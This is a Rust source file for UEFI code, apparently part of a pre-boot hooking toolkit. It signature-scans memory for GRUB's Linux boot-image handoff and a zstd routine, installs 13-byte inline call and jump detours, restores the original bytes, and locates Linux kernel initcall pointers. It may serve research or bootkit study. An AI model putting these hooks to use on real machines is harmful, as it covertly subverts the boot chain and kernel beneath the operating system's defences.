use elf::ElfBytes;
use elf::endian::AnyEndian;
use elf::section::SectionHeader;
use uefi::Status;

use log::debug;

/// ## Description
/// Signature unique to find grub_arch_efi_linux_boot_image function which receives:
/// - Kernel entry point
/// - Kernel size
/// - Args
///
/// Signature assembly:
/// ```assembly
/// mov     [rbp+var_48], rsi
/// call    rax
/// ```
pub const LINUX_BOOT_IMAGE_SIGNATURE: &[u8] = &[0x48, 0x89, 0x75, 0xB8, 0xFF, 0xD0];

pub const ZSTD_DECOMPRESS_FUNC_SIGNATURE: &[u8] =
    &[0xF3, 0x0F, 0x1E, 0xFA, 0x53, 0x48, 0x89, 0xFB, 0x48];

pub const INLINE_HOOK_SIZE: usize = 13;

const INITCALL_ARRAY_OFFSET: usize = 0x40;

pub struct InlineHook {
    pub target: usize,
    pub hook: usize,
    pub original_bytes: [u8; INLINE_HOOK_SIZE],
}

pub enum InitcallPhase {
    EarlyInitcall,
    CoreInitcall,
    PostCoreInitcall,
    ArchInitcall,
    SubsysInitcall,
    FsInitcall,
    DeviceInitcall,
    LateInitcall,
    ConsoleInitcall,
}

/// ## Description
/// binary_search performs a binary search for the given pattern in the specified memory region.
///
/// ## Arguments
/// - `data_address`: Starting address of the memory region to search.
/// - `data_size`: Size of the memory region to search.
/// - `pattern`: Byte pattern to search for.
///
/// ## Returns
/// - `Some(usize)`: Address where the pattern is found.
/// - `None`: If the pattern is not found in the specified memory region.
pub fn binary_search(data_address: usize, data_size: usize, pattern: &[u8]) -> Option<usize> {
    if data_address == 0 || pattern.is_empty() || data_size < pattern.len() {
        return None;
    }
    let data = unsafe { core::slice::from_raw_parts(data_address as *const u8, data_size) };

    for i in 0..=data.len().saturating_sub(pattern.len()) {
        if &data[i..i + pattern.len()] == pattern {
            return Some(data_address + i);
        }
    }
    None
}

/// ## Description
/// inline_hook installs an inline hook at the specified target address to redirect execution to the hook address.
///
/// ## Arguments
/// - `target`: Address where the hook should be installed.
/// - `hook`: Address of the hook function to redirect execution to.
///
/// ## Returns
/// - `Ok(InlineHook)`: Struct containing the target, hook, and original bytes for restoring later.
/// - `Err(Status)`: If the target or hook address is invalid.
pub fn inline_hook(target: usize, hook: usize) -> Result<InlineHook, Status> {
    if target == 0 || hook == 0 {
        return Err(Status::INVALID_PARAMETER);
    }

    let mut inline_hook = InlineHook {
        target,
        hook,
        original_bytes: [0; INLINE_HOOK_SIZE],
    };

    let mut patch = [0u8; INLINE_HOOK_SIZE];
    patch[0] = 0x49;
    patch[1] = 0xBA;
    patch[2..10].copy_from_slice(&(hook as u64).to_le_bytes());
    patch[10] = 0x41;
    patch[11] = 0xFF;
    patch[12] = 0xD2;

    let target_ptr = target as *mut u8;

    unsafe {
        core::ptr::copy_nonoverlapping(
            target_ptr as *const u8,
            inline_hook.original_bytes.as_mut_ptr(),
            INLINE_HOOK_SIZE,
        );
        core::ptr::copy_nonoverlapping(patch.as_ptr(), target_ptr, INLINE_HOOK_SIZE);
    }

    Ok(inline_hook)
}

/// ## Description
/// inline_jump_hook installs an inline jump hook at the specified target address.
///
/// Unlike `inline_hook`, this detour uses `jmp` instead of `call`, which keeps the
/// original caller's stack layout intact. That is required when replacing a real
/// function entry on x64, where the callee may read stack-passed arguments.
pub fn inline_jump_hook(target: usize, hook: usize) -> Result<InlineHook, Status> {
    if target == 0 || hook == 0 {
        return Err(Status::INVALID_PARAMETER);
    }

    let mut inline_hook = InlineHook {
        target,
        hook,
        original_bytes: [0; INLINE_HOOK_SIZE],
    };

    let mut patch = [0u8; INLINE_HOOK_SIZE];
    patch[0] = 0x49;
    patch[1] = 0xBA;
    patch[2..10].copy_from_slice(&(hook as u64).to_le_bytes());
    patch[10] = 0x41;
    patch[11] = 0xFF;
    patch[12] = 0xE2;

    let target_ptr = target as *mut u8;

    unsafe {
        core::ptr::copy_nonoverlapping(
            target_ptr as *const u8,
            inline_hook.original_bytes.as_mut_ptr(),
            INLINE_HOOK_SIZE,
        );
        core::ptr::copy_nonoverlapping(patch.as_ptr(), target_ptr, INLINE_HOOK_SIZE);
    }

    Ok(inline_hook)
}

/// ## Description
/// restore_inline_hook restores the original bytes at the specified target address to remove the inline hook.
///
/// ## Arguments
/// - `target`: Address where the original bytes should be restored.
/// - `original_bytes`: Byte slice containing the original bytes to restore.
///
/// ## Returns
/// - `Ok(())`: If the original bytes are successfully restored.
/// - `Err(Status)`: If the target address is invalid or the original bytes are empty.
pub fn restore_inline_hook(target: usize, original_bytes: &[u8]) -> Result<(), Status> {
    if target == 0 || original_bytes.len() != INLINE_HOOK_SIZE {
        return Err(Status::INVALID_PARAMETER);
    }

    let target_ptr = target as *mut u8;

    unsafe {
        core::ptr::copy_nonoverlapping(original_bytes.as_ptr(), target_ptr, INLINE_HOOK_SIZE);
    }

    Ok(())
}

/// ## Description
/// get_initcall_address searches for the address of the `late_initcall` function in the kernel memory.
///
/// ## Arguments
/// - `kernel_base`: Starting address of the kernel in memory.
/// - `kernel_size`: Size of the kernel in memory.
/// - `phase`: The specific initcall phase to search for (e.g., `LateInitcall`).
///
/// ## Returns
/// - `Some(usize)`: Address of the `late_initcall` function if found.
/// - `None`: If the `late_initcall` function is not found in the specified kernel memory.
pub fn get_initcall_phase_address(
    kernel_base: usize,
    kernel_size: usize,
    phase: InitcallPhase,
) -> Option<usize> {
    if kernel_base == 0 || kernel_size == 0 {
        return None;
    }

    let vmlinux = ElfBytes::<AnyEndian>::minimal_parse(unsafe {
        core::slice::from_raw_parts(kernel_base as *const u8, kernel_size)
    })
    .ok()?;

    let init_data_section: SectionHeader = vmlinux.find_section_by_name(".init.data").ok()?;
    let init_data_address = init_data_section.sh_addr as usize;
    let init_data_size = init_data_section.sh_size as usize;
    debug!(
        "Found .init.data section at address: {:#x}, size: {:#x}",
        init_data_address, init_data_size
    );
    let initcall_array_address = init_data_address + INITCALL_ARRAY_OFFSET;
    let initcall_ptr_address = match phase {
        InitcallPhase::EarlyInitcall => initcall_array_address,
        InitcallPhase::CoreInitcall => initcall_array_address + 8,
        InitcallPhase::PostCoreInitcall => initcall_array_address + 16,
        InitcallPhase::ArchInitcall => initcall_array_address + 24,
        InitcallPhase::SubsysInitcall => initcall_array_address + 32,
        InitcallPhase::FsInitcall => initcall_array_address + 40,
        InitcallPhase::DeviceInitcall => initcall_array_address + 48,
        InitcallPhase::LateInitcall => initcall_array_address + 56,
        InitcallPhase::ConsoleInitcall => initcall_array_address + 64,
    };
    let initcall_ptr = (unsafe { core::ptr::read(initcall_ptr_address as *const i32) } as i64
        + initcall_ptr_address as i64) as usize;
    debug!(
        "Initcall pointer for phase {:?} is at address: {:#x}",
        phase, initcall_ptr
    );
    Some(initcall_ptr as usize)
}
